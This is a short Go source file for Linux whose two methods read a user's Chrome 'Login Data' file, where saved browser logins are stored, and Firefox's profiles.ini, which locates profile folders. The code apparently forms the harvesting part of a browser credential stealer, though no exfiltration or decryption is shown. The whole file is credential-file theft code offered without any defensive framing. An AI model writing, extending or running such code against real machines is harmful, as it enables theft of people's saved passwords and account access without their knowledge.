package linux

import (
"os"
"path/filepath"
)

type LinuxBrowser struct{}

func NewLinuxBrowser() *LinuxBrowser {
return &LinuxBrowser{}
}

func (b *LinuxBrowser) ExtractChrome() (string, error) {
path := filepath.Join(os.Getenv("HOME"), ".config", "google-chrome", "Default", "Login Data")
data, err := os.ReadFile(path)
if err != nil {
return "", err
}
return string(data), nil
}

func (b *LinuxBrowser) ExtractFirefox() (string, error) {
path := filepath.Join(os.Getenv("HOME"), ".mozilla", "firefox", "profiles.ini")
data, err := os.ReadFile(path)
if err != nil {
return "", err
}
return string(data), nil
}
